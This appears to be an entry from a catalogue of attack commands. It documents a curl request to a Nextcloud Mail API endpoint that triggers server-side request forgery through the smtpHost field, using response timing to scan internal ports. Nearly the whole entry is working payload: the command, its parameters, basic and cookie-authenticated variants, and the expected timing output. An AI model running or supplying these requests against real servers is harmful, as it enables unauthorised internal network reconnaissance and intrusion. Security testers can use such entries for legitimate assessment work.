---
id: cmd-curl-mail-post-1746582
data: >-
  curl -w "%{time_total}" -X POST -H "OCS-APIRequest: true" -H "Content-Type:
  application/json" -d
  '{"imapHost":"ssl0.ovh.net","imapPort":993,"imapSslMode":"ssl","imapUser":"user","imapPassword":"pass","smtpHost":"127.0.0.1","smtpPort":PORT,"smtpSslMode":"none","smtpUser":"user","smtpPassword":"pass"}'
  https://nextcloud.example.com/ocs/v2.php/apps/mail/api/v1/accounts
tags:
  - ssrf
  - post
  - timing
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:09.829Z'
verified: false
validated: true
submitted: true
---
# curl-post-mail-setup

## Command

```bash
curl -w "%{time_total}" -X POST -H "OCS-APIRequest: true" -H "Content-Type: application/json" -d '{"imapHost":"ssl0.ovh.net","imapPort":993,"imapSslMode":"ssl","imapUser":"user","imapPassword":"pass","smtpHost":"127.0.0.1","smtpPort":PORT,"smtpSslMode":"none","smtpUser":"user","smtpPassword":"pass"}' https://nextcloud.example.com/ocs/v2.php/apps/mail/api/v1/accounts
```

## Description

Sends a POST request to Nextcloud Mail API to trigger SSRF via smtpHost, with timing output to measure connection delays for port scanning.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-w "%{time_total}"` | Outputs total response time in seconds | Yes |
| `-X POST` | Specifies POST method | Yes |
| `-H` | Adds headers for API and content type | Yes |
| `-d` | JSON payload with IMAP/SMTP details; replace PORT with target port | Yes |
| URL | Nextcloud OCS endpoint for Mail accounts | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H "OCS-APIRequest: true" -H "Content-Type: application/json" -d '{"smtpHost":"127.0.0.1","smtpPort":80}' https://nextcloud.example.com/ocs/v2.php/apps/mail/api/v1/accounts
```

### Advanced Usage

```bash
curl -w "%{time_total}" -X POST -H "OCS-APIRequest: true" -H "Cookie: nc_session=abc" -H "Content-Type: application/json" -d '{"imapHost":"ssl0.ovh.net","smtpHost":"127.0.0.1","smtpPort":5432}' https://nextcloud.example.com/ocs/v2.php/apps/mail/api/v1/accounts
```

## Expected Output

HTTP 200 OK response body with account status, preceded by timing (e.g., 5.200s) if port open, or quick response if closed.

## Related

- [[Related Procedure: Send-SSRF-POST-Request-via-smtpHost]]
